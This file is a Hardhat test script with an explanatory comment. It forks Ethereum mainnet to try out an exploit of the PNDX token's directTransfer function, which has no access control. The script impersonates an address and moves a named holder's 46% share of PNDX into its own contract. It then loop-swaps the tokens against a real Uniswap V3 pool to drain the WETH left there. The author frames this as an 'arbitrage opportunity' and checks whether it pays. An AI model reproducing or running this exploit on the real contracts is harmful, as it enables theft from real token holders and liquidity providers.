const {
    time,
    loadFixture,
  } = require("@nomicfoundation/hardhat-toolbox/network-helpers");
  const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
  const { expect } = require("chai");
  const { ethers } = require("hardhat");

// TO RUN WITH TRACES CALL:
// npx hardhat test --trace   (ankr public node in config)

// TO RUN WITHOUT TRACES CALL:
// npx hardhat run scripts/pond0x_no_tracing.js

/**
 This code simulates a transaction on an Ethereum Mainnet fork and shows call traces.
 
 A bit of context: there is a project called Pond0x (https://x.com/Pond0x). They created an unsuccessful token PNDX (https://etherscan.io/address/0x1d4214081985ad20aa3cA93A2206aE792635cBec)
 The reason was that it had a directTransfer function, which allowed to transfer any amount of tokens from any wallet (lacked an msg.sender == owner check). 
 I saw a potential opportunity: some UNIV3 pools still contained WETH inside (e.g. https://dexscreener.com/ethereum/0x702747ac260E54B5511c311610c5E55951E47406 still has 1.4 ETH inside)
 So, I found an arbitrage opportunity: what if I take the majority of supply from top holders and call the swap function on the poolAddress.

 Thus, this code creates a simple contract that transfers PNDX from top holder of (46% of the total supply), and loop-swaps the acquired tokens. 
 It uses a fork of Ethereum Mainnet to test if it actually works with the given pool reserves. (spoiler: the price is too low)
*/
  
describe("Lock", function () {
    async function deployOneYearLockFixture() {
        
        const myAddr = '0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045' // vitalik.eth
        const pondAddress = '0x1d4214081985ad20aa3cA93A2206aE792635cBec' // PNDX token address

        const owner = await ethers.getImpersonatedSigner(myAddr);
        console.log(`I have ${ethers.formatEther(await hre.ethers.provider.getBalance(owner.address))} ETH`)

        // uniV3pool with 1.4 ETH
        const poolAddress = '0x702747ac260E54B5511c311610c5E55951E47406'

        // deploy swapper
        console.log('-'.repeat(60), 'Deploy swapper call', '-'.repeat(60))
        const swapper = await deployContract(owner, 'SwapperTesting')

        // this address probably tried to do the same thing and aquired 46% of total supply of PNDX (https://etherscan.io/token/0x1d4214081985ad20aa3cA93A2206aE792635cBec#balances)
        // so we check it's balance, and transfer to our CA
        const halfTsHolder = '0xCb8fbA2bD501Ae711C178C50DaDcBC67e108eC13'

        const pond = new ethers.Contract(pondAddress, ['function balanceOf(address) view returns(uint256)', 'function directTransfer(address,address,uint256)'], owner)

        console.log('-'.repeat(60), 'PNDX balance and transfer calls', '-'.repeat(60))

        const whaleBal = await pond.balanceOf(halfTsHolder)
        const r = await pond.directTransfer(halfTsHolder, swapper.target, whaleBal)
        console.log('-'.repeat(120))

        console.log(`Whale balance = ${ethers.formatEther(whaleBal)} PNDX`)
        const transferResult = await r.wait()
        console.log(`Transfered PNDX to my contract with status = ${transferResult.status}`)
        

        
        const weth = new ethers.Contract('0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', ['function balanceOf(address) view returns(uint256)'], owner)
        console.log('-'.repeat(120))
        const initialWethBal = ethers.formatEther(await weth.balanceOf(swapper.target))
        console.log('-'.repeat(60), 'Reccur swap call', '-'.repeat(60))
        const recurSwap = await swapper.recurSwap(poolAddress, whaleBal)
        const finalWethBal = ethers.formatEther(await weth.balanceOf(swapper.target))
        console.log('-'.repeat(120))


        await logTxData(recurSwap, 'Reccur swapped')
        console.log(`\nInitial swapper WETH balance = ${initialWethBal}`)
        console.log(`After-swap swapper WETH balance = ${finalWethBal}`)
    }

    describe("Test 1", function () {
        it("Should make reccuring swaps", async function () {
            await loadFixture(deployOneYearLockFixture);
        });
    });
});
  
async function deployContract(owner, caName, constructor=[]) {
    const CA = await ethers.getContractFactory(caName);
    const ca = await CA.connect(owner).deploy(constructor);
    return ca
}


async function logTxData(r, note='Tx done') {
    const rec = await r.wait()
    console.log(`Tx used ${rec.gasUsed} gas`)
    console.log(`${note} with status = ${rec.status}`)
    console.log(`Paid ${ethers.formatEther(rec.gasPrice*rec.gasUsed)} ETH for tx`)
    return
}
  